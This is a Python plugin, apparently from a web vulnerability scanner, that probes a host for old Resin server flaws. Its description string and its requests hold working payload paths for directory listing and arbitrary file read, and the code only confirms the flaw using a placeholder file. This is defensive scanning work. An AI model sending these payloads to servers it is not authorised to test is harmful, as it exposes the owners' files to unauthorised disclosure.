#!/usr/bin/env python
# -*- coding: utf-8 -*-
from lib.common import *

def run_domain(http,ob):
    list = []
    try:
        domain = ob['domain']
        detail = u"Resin是CAUCHO公司的产品，是一个非常流行的application server，对servlet和JSP提供了良好的支持，性能也比较优良，resin自身采用JAVA语言开发。一些旧版本的Resin服务器存在读取任意文件或者直接列出目标目录文件的漏洞。攻击都可以通过分析源码，找到漏洞。列目录：\'/%3fjsp\',读取任意文件：\'/resin-doc/viewfile/?contextpath=/&servletpath=&file=读取的文件名\'"
        detail = detail.encode('utf8')
    
        url = "%s://%s%s" % (ob['scheme'],ob['domain'],ob['base_path'])
        url += "%3f.jsp"
        res, content = requestUrl(http,url,ob['task_id'],ob['domain_id'])
        if res['status'] == '200' and content.find('<title>Directory of') >= 0:
            request = getRequest(url)
            response = getResponse(res)
            list.append(getRecord(ob,url,ob['level'],detail,request,response))
        else:
            url = "%s://%s/" % (ob['scheme'],domain)
            url += "resin-doc/viewfile/?contextpath=/&servletpath=&file=fakefile.xml"
            res, content = requestUrl(http,url,ob['task_id'],ob['domain_id'])
            if res['status'] == '200' and (content.find('not found /fakefile.xml') >= 0 or content.find('<title>fakefile.xml') >= 0):
                request = getRequest(url)
                response = getResponse(res)
                list.append(getRecord(ob,url,ob['level'],detail,request,response))
            #end if
        #end if
    except Exception,e:
        logging.getLogger().error("File:ResinConfScript.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:ResinConfScript.py, run_domain function :" + str(e))
    #end try
    
    return list
#end def



